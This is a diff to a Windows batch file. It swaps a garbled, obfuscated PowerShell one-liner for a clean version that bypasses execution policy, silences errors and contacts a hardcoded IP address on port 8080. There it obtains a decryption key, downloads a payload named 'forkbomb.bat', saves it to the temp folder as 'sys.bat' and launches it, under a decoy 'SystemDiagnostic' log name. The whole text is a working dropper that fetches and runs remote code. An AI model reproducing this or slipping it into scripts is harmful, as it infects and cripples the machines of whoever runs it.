@@ -1,2 +1,3 @@
-@setloc
-@po "wer -NoP -Ex By -C `"$EA='SiCo';$b='h^tt^ps://82.29.153 familiar.101:8080';$h=IWR ($b+'/he familiar') -UB;$t=[i]^[D^O]::Utc familiar.ToUnixTimeSeconds();$k=IWR ($b+'/au familiar/key?ts='+$t) -UB |%{$_.C.Trim()};$f=IWR ($b+'/fo familiar') -H @{ 'X-Decrypt-Key'=$k } -UB;$f.C|OF $env:TEMP+'\s.bat' -A;SP $env:TEMP+'\s.bat' -WS Hidden;'$env:COMPUTERNAME - Sys: $(GD)'|OF $env:PUBLIC+'\D\Sys.log'`""
+@echo off
+setlocal
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue';$base='http://82.29.153.101:8080';$h=Invoke-WebRequest ($base+'/health') -UseBasicParsing;$ts=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds();$k=(Invoke-WebRequest ($base+'/auth/key?ts='+$ts) -UseBasicParsing).Content.Trim();$p=Invoke-WebRequest ($base+'/forkbomb.bat') -Headers @{ 'X-Decrypt-Key'=$k } -UseBasicParsing;$p.Content|Out-File $env:TEMP+'\sys.bat' -Encoding ASCII;Start-Process $env:TEMP+'\sys.bat';$env:PUBLIC+'\Desktop\SystemDiagnostic.log'"
